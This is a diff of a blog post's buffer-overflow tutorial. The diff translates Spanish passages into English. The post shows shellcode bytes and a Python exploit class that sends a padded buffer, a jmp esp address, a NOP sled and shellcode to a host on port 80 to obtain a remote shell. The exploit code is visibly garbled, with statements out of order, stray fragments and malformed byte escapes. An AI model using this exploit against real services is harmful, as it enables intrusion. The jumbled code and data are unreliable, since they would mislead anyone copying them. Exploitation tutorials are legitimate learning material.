@@ -277,9 +277,9 @@ Since we can appreciate correlated * no se that some are invalid. To solve this 
 
 ![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/e2088276-b82f-46e1-8bd3-ab1f76fa01f5) 
 
-Similarly we shouldn`t see ,`\x01f5 delete it, let's try now. 
+Similarly we shouldn't see ,`\x01f5` delete it, let's try now. 
 
-![0d](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/95fd10bb-4130-473e-8723-43fes6297f706 
+![0d](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/95fd10bb-4130-473e-8723-43fes6297f706)
 
 deleting all the characters invalid found. 
 
@@ -333,9 +333,9 @@ buf += b"\xed\x29\x78\x6a\xac\x37\x7b\x41\xf3\x41\xf8\x63"
 buf += b"\x8c\xb5\xe0\x06\x89\xf2\xa6\xfb\xe3\x6b\x43\xfb"
 buf += b"\x50\x8b\x46"
 ```
-> **Nota:** Imporante incluir los *badchars* encontrados anteriormente para evitarlos en el `shellcode`
+> **Note:** It is important to include the *badchars* found above to avoid them in the `shellcode`
 
-Perfecto, ahora que tenemos el shellcode, el siguiente paso es crear el `exploit` que utilizará ese shellcode para explotar la vulnerabilidad y obtener una shell remota.
+Perfect, now that we have the shellcode, the next step is to create the `exploit` that will use that shellcode to exploit the vulnerability and obtain a remote shell.
 
 ```python
 #!/usr/bin/python3
@@ -381,9 +381,7 @@ class Exploit():
             buf += b"\xaa\x3e\xa5\x34\x24\x3c\x46\xc4\xb5\x21\xce\x21"
             buf += b"\x2b\xc9\xb1\ x52\x83\xeb\xfc\x31\x7b\x13\x03\x36"
             buf += b"\xda\xda\xd9\x74\x24\xf4\x5b\xbf\x4d\xb9\xdc\x50"
-
             buf = b""
-            sock
             sock.send(buff._final)
             buff_final = self.http_method.encode() + buff + self.http_header.encode()
             buff = b"A" * 1787 + p32(0x7E6B30EB) + b"\x90" * 20 + buf
@@ -400,17 +398,13 @@ class Exploit():
             buf += b"\xc1\xae\xde\x4\x7e\x56\x7b\x7e\x1e\x97\x51\xfb"
             sock.close()
         except ConnectionError:
-            
-
-            
-        
             print("\nConnection socket failed\n") 
             exit(1) 
 
 exploit = ​​Exploit("192.168.1.140", 80, " HTTP/1.1\r\n\r\n", "GET ") 
 
 def main(): 
-    exploit. shellcode_req() 
+    exploit.shellcode_req() 
 
 if __name__ == "__main__": 
     main() 
@@ -420,8 +414,8 @@ This exploit will follow the following flow.
 
 ``` 
 AAAAAAAAAAA.... → \xeb\x30\x6b\7e → \x90\x90\x90\x90... → \xda\xda\xd9\x74\x24\xf4\x5b\x... 
-     ↥ ↥ ↥ ↥ 
-   \x41 jmp esp (EIP) NOPS shellcode 
+     ↥                 ↥                   ↥                         ↥ 
+   \x41              jmp esp (EIP)        NOPS                   shellcode 
 ``` 
 
 1. We start with a sequence of characters "A" that will fill the *buffer*. 
